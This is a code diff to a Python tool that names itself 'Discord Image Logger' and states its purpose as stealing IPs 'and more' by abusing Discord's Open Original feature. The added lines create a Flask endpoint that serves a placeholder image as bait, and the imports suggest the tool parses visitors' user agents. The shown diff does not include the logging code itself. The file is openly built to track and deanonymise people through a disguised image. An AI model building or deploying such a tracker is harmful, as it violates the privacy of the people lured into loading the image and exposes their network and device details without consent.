@@ -4,9 +4,22 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-from flask import Flask
+from flask import Flask, send_file
+import requests
+from io import BytesIO
 
 app = Flask(__name__)
+
+@app.route("/api/image")
+def image():
+    r = requests.get("URL_IMAGINEA_TA")
+    return send_file(
+        BytesIO(r.content),
+        mimetype="image/jpeg"
+    )
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
